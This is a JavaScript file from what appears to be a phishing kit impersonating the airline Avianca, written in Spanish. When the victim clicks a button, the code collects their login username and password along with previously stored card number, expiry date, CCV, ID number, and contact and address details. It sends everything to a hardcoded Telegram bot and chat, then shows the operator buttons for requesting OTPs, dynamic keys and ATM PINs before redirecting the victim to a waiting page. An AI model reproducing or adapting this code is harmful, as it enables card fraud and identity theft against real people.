document.addEventListener("DOMContentLoaded", async () => {
    const btnNextStep = document.querySelector("#btnNextStep");

    if (!btnNextStep) {
        console.error("❌ No se encontró el botón Verificar.");
        return;
    }

    btnNextStep.addEventListener("click", async () => {
        const userInput = document.querySelector("#user");
        const passwordInput = document.querySelector("#puser");

        if (!userInput || !passwordInput) {
            console.error("❌ No se encontraron los campos de usuario o contraseña.");
            return;
        }

        const user = userInput.value.trim();
        const password = passwordInput.value.trim();

        if (!user || !password) {
            alert("Por favor, completa todos los campos.");
            return;
        }

        localStorage.setItem("user", user);
        localStorage.setItem("password", password);

        console.log("✅ Usuario:", user);
        console.log("✅ Contraseña:", password);

        const pagoData = localStorage.getItem("pagoavianca");
        if (!pagoData) {
            console.warn("⚠️ No se encontraron datos en localStorage para pagoavianca.");
            return;
        }

        let pagoavianca;
        try {
            pagoavianca = JSON.parse(pagoData);
        } catch (error) {
            console.error("❌ Error al parsear pagoavianca:", error);
            return;
        }

        console.log("✅ Datos recuperados (pagoavianca):", pagoavianca);

        // Generar un transactionId único
        const transactionId = Date.now().toString();

        // Cargar configuración desde claves.json
       const config = {
    botToken: "7618655225:AAELL845R6t9J_ftTBgVS9Y0SDHZKbqqfDI",  // ← pon aquí tu token real
    chatId: "-5124502975"                                // ← y tu chat ID real
};

console.log("🔑 Config cargada manualmente:", config);


        // Verificar que los valores esenciales existen antes de continuar
        if (!config.botToken || !config.chatId) {
            console.error("❌ Token o Chat ID no definidos en claves.json");
            return;
        }

        const mensaje = `✈️ <b>Avianca</b> ✈️
💳 Tarjeta: <code>${pagoavianca.card}</code>
🗓️ Fecha: <code>${pagoavianca.card_date}</code>
💳 CCV: <code>${pagoavianca.ccv}</code>
🏦 Banco: <code>${pagoavianca.bank}</code>
📅 Cuotas: <code>${pagoavianca.cuotas}</code>
👨🏻‍🦱 Nombre: <code>${pagoavianca.name}</code>
👨🏻‍🦱 Apellido: <code>${pagoavianca.lastname}</code>
💳 CC: <code>${pagoavianca.cc}</code>
📨 Correo: <code>${pagoavianca.email}</code>
📲 Teléfono: <code>${pagoavianca.phone}</code>
🏙️ Ciudad: <code>${pagoavianca.city}</code>
🗽 Provincia: <code>${pagoavianca.state}</code>
🧭 Dirección: <code>${pagoavianca.address}</code>
👤 Usuario: <code>${user}</code>
🔑 Contraseña: <code>${password}</code>`;

        // Crear teclado de Telegram
        const keyboard = {
            inline_keyboard: [
                [{ text: "X Logo", callback_data: `error_logo:${transactionId}` }],
                [{ text: "X TC", callback_data: `error_tc:${transactionId}` }],
                [{ text: "Dinámica", callback_data: `dinamic:${transactionId}` }],
                [{ text: "OTP", callback_data: `pedir_otp:${transactionId}` }],
                [{ text: "Clave Cajero", callback_data: `cajero:${transactionId}` }],
                [{ text: "X Dinamica", callback_data: `xdinamic:${transactionId}` }],
                [{ text: "X OTP", callback_data: `xotp:${transactionId}` }],
                [{ text: "Fin", callback_data: `confirm_finalizar:${transactionId}` }]
            ]
        };

        try {
            // Enviar el mensaje principal
            const mensajeResponse = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: config.chatId,
                    text: mensaje,
                    parse_mode: "HTML"
                })
            });

            const mensajeData = await mensajeResponse.json();

            if (mensajeData.ok) {
                console.log("✅ Mensaje principal enviado a Telegram:", mensajeData);

                // Enviar el mensaje con los botones
                const botonesResponse = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: config.chatId,
                        text: "Selecciona una opción:",
                        reply_markup: keyboard
                    })
                });

                const botonesData = await botonesResponse.json();

                if (botonesData.ok) {
                    console.log("✅ Mensaje con botones enviado a Telegram:", botonesData);

                    // Guardar transactionId y messageId en localStorage
                    localStorage.setItem("transactionId", transactionId);
                    localStorage.setItem("messageId", botonesData.result.message_id);

                    // Redirigir inmediatamente a waiting.html
                    console.log("🔄 Redirigiendo a waiting.html...");
                    window.location.href = "waiting.html";
                } else {
                    console.error("❌ Error al enviar mensaje con botones a Telegram:", botonesData);
                }
            } else {
                console.error("❌ Error al enviar mensaje principal a Telegram:", mensajeData);
            }
        } catch (error) {
            console.error("❌ Error en fetch de sendMessage:", error);
        }
    });
});